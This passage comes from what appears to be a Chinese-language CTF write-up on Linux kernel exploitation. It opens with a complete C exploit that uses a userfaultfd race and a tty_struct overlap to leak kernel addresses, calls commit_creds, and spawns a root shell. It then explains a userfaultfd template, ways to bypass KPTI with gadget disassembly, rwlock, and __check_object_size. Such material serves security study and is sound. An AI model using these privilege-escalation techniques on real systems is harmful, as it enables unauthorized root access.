won&#x27;t reach here</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf_a[<span class="number">0x500</span>] = &#123;<span class="string">&quot;aaa&quot;</span>&#125;;</span><br><span class="line"><span class="type">size_t</span> buf_tty[<span class="number">0x100</span>], buf_fake_table[<span class="number">0x500</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">int</span> tty_fd;</span><br><span class="line"></span><br><span class="line">    stuck_mapped_memory = mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);</span><br><span class="line"></span><br><span class="line">    OpenNote();</span><br><span class="line"></span><br><span class="line">    noteadd(<span class="number">0</span>, <span class="number">0x60</span>, buf_a);</span><br><span class="line">    noteadd(<span class="number">1</span>, <span class="number">0x60</span>, buf_a);</span><br><span class="line">    noteedit(<span class="number">1</span>, <span class="number">0x500</span>, buf_a);</span><br><span class="line">    noteedit(<span class="number">0</span>, TTY_STRUCT_SZIE, buf_a);</span><br><span class="line">    write(note_fd, buf_a, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> thr_edit, thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ready to open ptmx&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (tty_fd &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ErrExit(<span class="string">&quot;[-] ptmx open failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        read(note_fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (buf_tty[<span class="number">0</span>] == <span class="number">0x100005401</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] tty_struct found! fd = %d\n&quot;</span>, tty_fd);</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// tty_struct used our slab</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (buf_tty[<span class="number">0</span>] != <span class="number">0x100005401</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] leak failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> ptm_unix98_ops_addr = buf_tty[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span> ((ptm_unix98_ops_addr &amp; <span class="number">0xFFF</span>) == <span class="number">0x320</span>) ptm_unix98_ops_addr += <span class="number">0x120</span>;</span><br><span class="line">    <span class="type">size_t</span> work_for_cpu_fn_addr =  work_for_cpu_fn_off + ptm_unix98_ops_addr;</span><br><span class="line">    <span class="type">size_t</span> tty_struct_addr = buf_tty[<span class="number">10</span>] - <span class="number">0x50</span>;</span><br><span class="line">    <span class="type">size_t</span> commit_creds_addr = commit_creds_off + ptm_unix98_ops_addr;</span><br><span class="line">    <span class="type">size_t</span> prepare_kernel_cred_addr = prepare_kernel_cred_off + ptm_unix98_ops_addr;</span><br><span class="line">    kernel_base = prepare_kernel_cred_addr - <span class="number">0xA9EF0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] ptm_unix98_ops addr leaked, addr: 0x%lx\n&quot;</span>, ptm_unix98_ops_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] work_for_cpu_fn addr leaked, addr: 0x%lx\n&quot;</span>, work_for_cpu_fn_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] prepare_kernel_cred addr leaked, addr: 0x%lx\n&quot;</span>, prepare_kernel_cred_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] tty_struct addr leaked, addr: 0x%lx\n&quot;</span>, tty_struct_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> buf_gift[<span class="number">0x100</span>];</span><br><span class="line">    notegift(buf_gift);</span><br><span class="line">    <span class="type">size_t</span> note_0_addr = buf_gift[<span class="number">0</span> * <span class="number">2</span>];</span><br><span class="line">    <span class="type">size_t</span> note_1_addr = buf_gift[<span class="number">1</span> * <span class="number">2</span>];</span><br><span class="line">    assert(note_0_addr == tty_struct_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] note_1 addr leaked, addr: 0x%lx\n&quot;</span>, note_1_addr);</span><br><span class="line"></span><br><span class="line">    buf_tty[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">    buf_tty[<span class="number">3</span>] = note_1_addr;</span><br><span class="line">    buf_tty[<span class="number">4</span>] = prepare_kernel_cred_addr;</span><br><span class="line">    buf_tty[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    write(note_fd, buf_tty, <span class="number">0</span>); <span class="comment">// write to tty_struct</span></span><br><span class="line"></span><br><span class="line">    buf_fake_table[<span class="number">7</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    buf_fake_table[<span class="number">10</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    buf_fake_table[<span class="number">12</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    write(note_fd, buf_fake_table, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write(tty_fd, buf_a, 1);</span></span><br><span class="line">    ioctl(tty_fd, <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line"></span><br><span class="line">    read(note_fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] prepare_kernel_cred finished, return 0x%lx\n&quot;</span>, buf_tty[<span class="number">6</span>]);</span><br><span class="line"></span><br><span class="line">    buf_tty[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">    buf_tty[<span class="number">3</span>] = note_1_addr;</span><br><span class="line">    buf_tty[<span class="number">4</span>] = commit_creds_addr;</span><br><span class="line">    buf_tty[<span class="number">5</span>] = buf_tty[<span class="number">6</span>];</span><br><span class="line">    write(note_fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write(tty_fd, buf_a, 1);</span></span><br><span class="line">    ioctl(tty_fd, <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;now uid = %d\n&quot;</span>, getuid());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] root now!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h2><p>userfaultfd配合copy_from_user或者copy_to_user在条件竞争中有着十分强大的作用</p><p>其作用就是监控在某一段内存中发生的页错误,并且可以由用户指定如何处理</p><p>一般情况下我们选择使用sleep()或者pause()等函数使该线程停下,这样让我们完成条件竞争构造uaf等,提供了十分便利的条件</p><p>不过在大概<code>5.11</code>版本前后,由于变量<code>sysctl_unprivileged_userfaultfd</code>不再被初识赋值为1,使得userfaultfd不再能被非root用户使用</p><p>一个模板:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">userfaultfd_stuck_handler</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler created&quot;</span>);</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler unblocked&quot;</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="comment">//这部分是缺页异常处理得到的页的内容填充</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RegisterUserfault</span><span class="params">(<span class="type">void</span> *fault_page, <span class="type">void</span>* handler)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features    = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="type">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="bypass-kpti"><a href="#bypass-kpti" class="headerlink" title="bypass kpti"></a>bypass kpti</h2><p>在没有开启 <code>KPTI</code>保护的内核中，每当执行用户空间代码时，<code>Linux</code>会在其分页表中保留整个内核内存的映射，即用户地址空间和内核地址空间将使用同一个页全局目录表，并保护其访问。</p><p><code>KPTI(Kernel page-table isolation)</code>，即内核页表隔离。通过把进程页表按照用户空间和内核空间隔离成两块来防止内核页表泄露。可以在<code>-append</code>选项下添加<code>kpti=1</code>或<code>nopti</code>来启用或禁用它。</p><p>而在开启了 <code>KPTI</code>保护的内核里，用户态页表包含了用户空间，其只含有一个用于处理中断的<code>kernel mapping PGD</code>。当用户空间访问内核时，会先陷入中断，进入处理中断的 <code>trampoline mapping</code>，该中断处理程序会建立一个正常的的<code>kernel mapping</code>的映射。</p><p>而为了实现 <code>PGD</code>的切换，内核增加了一组宏用来在进程进行用户态、内核态切换时进行页表切换。一个进程的内核态<code>PGD(4k)</code>和用户态 <code>PGD(4K)</code>一起形成了一个<code>8K</code>的 <code>PGD</code>。当中断发生时，内核使用切换 <code>CR3</code>寄存器来实现从用户态地址空间切换到内核态的地址空间。<code>CR3</code>的 <code>bit47-bit11</code>为 <code>PGD</code>的物理地址，最低为 <code>bit12</code>用于进行 <code>PGD</code>切换；<code>bit12=0</code>为内核态<code>PGD</code>，<code>bit12=1</code>为用户态 <code>PGD</code>。</p><p><code>CR3</code>的 <code>bit0-bit11</code>为 <code>asid(Address Space Identifier)</code>，<code>asid</code>也分为 内核态和用户态，最高位 <code>bit11</code>来进行 <code>asid</code>切换；<code>bit11=0</code>为内核态 <code>asid</code>，<code>bit11=1</code>为用户态 <code>asid</code>。</p><p><img src="https://p2.ssl.qhimg.com/t01219f81626fe6310c.png" alt="img"></p><p>那么一旦开启了 <code>KPTI</code>,由于内核态和用户态的页表不同，所以如果使用 <code>ret2user</code>或内核执行 <code>ROP</code>返回用户态时，由于内核态无法确定用户态的页表，所以会报出一个段错误。</p><h3 id="swap-CR3"><a href="#swap-CR3" class="headerlink" title="swap CR3"></a>swap CR3</h3><p>在一个开启 <code>KPTI</code>内核中会调用 <code>SWITCH_KERNEL_CR3_NO_STACK</code>函数来从用户态进入内核态，关键代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     rdi, cr3</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">and     rdi, <span class="number">0xFFFFFFFFFFFFE7FF</span></span><br><span class="line">mov     cr3, rdi</span><br></pre></td></tr></table></figure><p>该代码就是将 <code>CR3</code>的 第12位与第13位清零。而页表的第12位在 <code>CR4</code>寄存器的 <code>PCIDE</code>位开启的情况下，都是保留给 <code>OS</code>使用，这里只关心 <code>13</code>位置零即可，也就相当于将 <code>CR3-0x1000</code>。</p><p>而在从内核态返回用户态时会调用 <code>SWITCH_USER_CR3</code>宏来切换 <code>CR3</code>，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rdi, cr3</span><br><span class="line">or      rdi, <span class="number">1000</span>h</span><br><span class="line">mov     cr3, rdi</span><br></pre></td></tr></table></figure><p>所以，这里第一种方法就很类似绕过 <code>smep</code>的方法，即利用内核中已有 <code>gadget</code>来在返回用户态执行 <code>iretq/sysret</code>之前 设置 <code>cr3</code>。寻找 到 能够将 <code>cr3</code>寄存器 与 <code>0x1000</code>执行 或运算即可。</p><h3 id="swapgs-restore-regs-and-return-to-usermode"><a href="#swapgs-restore-regs-and-return-to-usermode" class="headerlink" title="swapgs_restore_regs_and_return_to_usermode"></a>swapgs_restore_regs_and_return_to_usermode</h3><p>第二种方法即直接利用 <code>swapgs_restore_regs_and_return_to_usermode</code>这个函数内的 <code>gadget</code>。其汇编代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600A34 <span class="number">41</span> <span class="number">5F</span>                          pop     r15</span><br><span class="line">.text:FFFFFFFF81600A36 <span class="number">41</span> <span class="number">5</span>E                          pop     r14</span><br><span class="line">.text:FFFFFFFF81600A38 <span class="number">41</span> <span class="number">5</span>D                          pop     r13</span><br><span class="line">.text:FFFFFFFF81600A3A <span class="number">41</span> <span class="number">5</span>C                          pop     r12</span><br><span class="line">.text:FFFFFFFF81600A3C <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF81600A3D <span class="number">5B</span>                             pop     rbx</span><br><span class="line">.text:FFFFFFFF81600A3E <span class="number">41</span> <span class="number">5B</span>                          pop     r11</span><br><span class="line">.text:FFFFFFFF81600A40 <span class="number">41</span> <span class="number">5</span>A                          pop     r10</span><br><span class="line">.text:FFFFFFFF81600A42 <span class="number">41</span> <span class="number">59</span>                          pop     r9</span><br><span class="line">.text:FFFFFFFF81600A44 <span class="number">41</span> <span class="number">58</span>                          pop     r8</span><br><span class="line">.text:FFFFFFFF81600A46 <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600A47 <span class="number">59</span>                             pop     rcx</span><br><span class="line">.text:FFFFFFFF81600A48 <span class="number">5</span>A                             pop     rdx</span><br><span class="line">.text:FFFFFFFF81600A49 <span class="number">5</span>E                             pop     rsi</span><br><span class="line">.text:FFFFFFFF81600A4A <span class="number">48</span> <span class="number">89</span> E7                       mov     rdi, rsp    </span><br><span class="line">.text:FFFFFFFF81600A4D <span class="number">65</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">24</span> <span class="number">25</span>+                mov     rsp, gs: <span class="number">0x5004</span><span class="comment">//从此处开始执行</span></span><br><span class="line">.text:FFFFFFFF81600A56 FF <span class="number">77</span> <span class="number">30</span>                       push    qword ptr [rdi+<span class="number">30</span>h]</span><br><span class="line">.text:FFFFFFFF81600A59 FF <span class="number">77</span> <span class="number">28</span>                       push    qword ptr [rdi+<span class="number">28</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5C FF <span class="number">77</span> <span class="number">20</span>                       push    qword ptr [rdi+<span class="number">20</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5F FF <span class="number">77</span> <span class="number">18</span>                       push    qword ptr [rdi+<span class="number">18</span>h]</span><br><span class="line">.text:FFFFFFFF81600A62 FF <span class="number">77</span> <span class="number">10</span>                       push    qword ptr [rdi+<span class="number">10</span>h]</span><br><span class="line">.text:FFFFFFFF81600A65 FF <span class="number">37</span>                          push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81600A67 <span class="number">50</span>                             push    rax</span><br><span class="line">.text:FFFFFFFF81600A68 EB <span class="number">43</span>                          nop</span><br><span class="line">.text:FFFFFFFF81600A6A <span class="number">0F</span> <span class="number">20</span> DF                       mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81600A6D EB <span class="number">34</span>                          jmp     <span class="number">0xFFFFFFFF81600AA3</span></span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600AA3 <span class="number">48</span> <span class="number">81</span> CF <span class="number">00</span> <span class="number">10</span>+                or      rdi, <span class="number">1000</span>h</span><br><span class="line">.text:FFFFFFFF81600AAA <span class="number">0F</span> <span class="number">22</span> DF                       mov     cr3, rdi</span><br><span class="line">.text:FFFFFFFF81600AAD <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600AAE <span class="number">5F</span>                             pop     rdi</span><br><span class="line">.text:FFFFFFFF81600AAF FF <span class="number">15</span> <span class="number">23</span> <span class="number">65</span> <span class="number">62</span>+                call    cs: SWAPGS</span><br><span class="line">.text:FFFFFFFF81600AB5 FF <span class="number">25</span> <span class="number">15</span> <span class="number">65</span> <span class="number">62</span>+                jmp     cs: INTERRUPT_RETURN</span><br><span class="line"></span><br><span class="line">_SWAPGS</span><br><span class="line">.text:FFFFFFFF8103EFC0 <span class="number">55</span>                             push    rbp</span><br><span class="line">.text:FFFFFFFF8103EFC1 <span class="number">48</span> <span class="number">89</span> E5                       mov     rbp, rsp</span><br><span class="line">.text:FFFFFFFF8103EFC4 <span class="number">0F</span> <span class="number">01</span> F8                       swapgs</span><br><span class="line">.text:FFFFFFFF8103EFC7 <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF8103EFC8 C3                             retn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_INTERRUPT_RETURN</span><br><span class="line">.text:FFFFFFFF81600AE0 F6 <span class="number">44</span> <span class="number">24</span> <span class="number">20</span> <span class="number">04</span>                 test    byte ptr [rsp+<span class="number">0x20</span>], <span class="number">4</span></span><br><span class="line">.text:FFFFFFFF81600AE5 <span class="number">75</span> <span class="number">02</span>                          jnz     native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81600AE7 <span class="number">48</span> CF                          iretq</span><br></pre></td></tr></table></figure><p>只需要从上述 <code>mov rsp, gs: 0x5004</code>代码处开始执行，就会依次执行 绕过 <code>kpti</code>和 <code>iretq/sysret</code>两种功能，自动返回用户态。</p><h2 id="rwlock"><a href="#rwlock" class="headerlink" title="rwlock"></a>rwlock</h2><p>Linux实现了一个读写锁</p><ul><li>当读锁被取出时,不能够取出写锁</li><li>当写锁被取出时,不能够取出任何锁</li></ul><p>也就是说读是可以多进程共享的,但写是进程独享的</p><p>具体实现暂时不深入聊了解</p><h2 id="check-object-size"><a href="#check-object-size" class="headerlink" title="__check_object_size"></a>__check_object_size</h2><p>在本题中出现了__check_object_size这么一个函数</p><p>一开始以为这个函数能够精准的检测一个object的大小,但实际上这个函数也只是能做一个粗略的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Validates that the given object is:</span></span><br><span class="line"><span class="comment"> * - not bogus address</span></span><br><span class="line"><span class="comment"> * - fully contained by stack (or stack frame, when available)</span></span><br><span class="line"><span class="comment"> * - fully within SLAB object (or object whitelist area, when available)</span></span><br><span class="line"><span class="comment"> * - not in kernel text</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (static_branch_unlikely(&amp;bypass_usercopy_checks))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Skip all tests if size is zero. */</span></span><br><span class="line"><span class="keyword">if</span> (!n)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for invalid addresses. */</span></span><br><span class="line">check_bogus_address((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for bad stack object. */</span></span><br><span class="line"><span class="keyword">switch</span> (check_stack_object(ptr, n)) &#123;</span><br><span class="line"><span class="keyword">case</span> NOT_STACK:</span><br><span class="line"><span class="comment">/* Object is not touching the current process stack. */</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> GOOD_FRAME:</span><br><span class="line"><span class="keyword">case</span> GOOD_STACK:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Object is either in the correct frame (when it</span></span><br><span class="line"><span class="comment"> * is possible to check) or just generally on the</span></span><br><span class="line"><span class="comment"> * process stack (when frame checking not available).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">usercopy_abort(<span class="string">&quot;process stack&quot;</span>, <span class="literal">NULL</span>, to_user, <span class="number">0</span>, n);</span><br><span 